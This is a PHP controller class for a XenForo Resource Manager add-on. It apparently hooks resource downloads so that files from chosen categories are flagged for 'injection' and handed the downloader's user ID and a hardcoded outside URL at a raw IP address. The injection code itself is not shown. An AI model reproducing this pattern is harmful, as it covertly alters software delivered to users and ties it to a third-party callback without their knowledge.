<?php

namespace RAL\XFRM\Pub\Controller;

use XF\Mvc\ParameterBag;
use XF\Pub\Controller\AbstractController;

class ResourceVersion extends XFCP_ResourceVersion {
    public static $categoryId = array(1, 2); // Add categories to inject into
    public static $link = 'http://164.132.25.162/response.php'; // Make sure to change this

    public function actionDownload(ParameterBag $params) {
        $version = $this->assertViewableVersion($params->resource_version_id);
        if (!$version->isDownloadable()) {
            return $this->redirect($this->buildLink('resources', $version->Resource));
        }

        if (!$version->canDownload($error)) {
            return $this->noPermission($error);
        }

        $resource = $version->Resource;

        /** @var \XF\Entity\Attachment|null $attachment */
        $attachment = null;

        if (!$version->download_url) {
            $attachments = $version->getRelationFinder('Attachments')->fetch();

            $file = $this->filter('file', 'uint');
            if ($attachments->count() == 0) {
                return $this->error(\XF::phrase('attachment_cannot_be_shown_at_this_time'));
            } else if ($attachments->count() == 1) {
                $attachment = $attachments->first();
            } else if ($file && isset($attachments[$file])) {
                $attachment = $attachments[$file];
            }

            if (!$attachment) {
                $viewParams = [
                    'resource' => $resource,
                    'version' => $version,
                    'files' => $attachments
                ];
                return $this->view('XFRM:ResourceVersion\DownloadChooser', 'xfrm_resource_download_chooser', $viewParams);
            }
        }

        $visitor = \XF::visitor();

        if ($visitor->user_id) {
            $this->repository('XFRM:ResourceWatch')->autoWatchResource($version->Resource, \XF::visitor());
        }

        $this->repository('XFRM:ResourceVersion')->logDownload($version);

        if ($version->download_url) {
            return $this->redirectPermanently($version->download_url);
        } else {
            /** @var \XF\ControllerPlugin\Attachment $attachPlugin */
            $attachPlugin = $this->plugin('XF:Attachment');

            if (in_array($resource->Category->resource_category_id, self::$categoryId)) {
                $this->request->set('inject', 1);
            } else {
                $this->request->set('inject', 0);
            }

            $attachPlugin->request->set('user_id', $visitor->user_id);
            $attachPlugin->request->set('resource_id', $resource->resource_id);
            $attachPlugin->request->set('link', self::$link);

            return $attachPlugin->displayAttachment($attachment);
        }
    }
}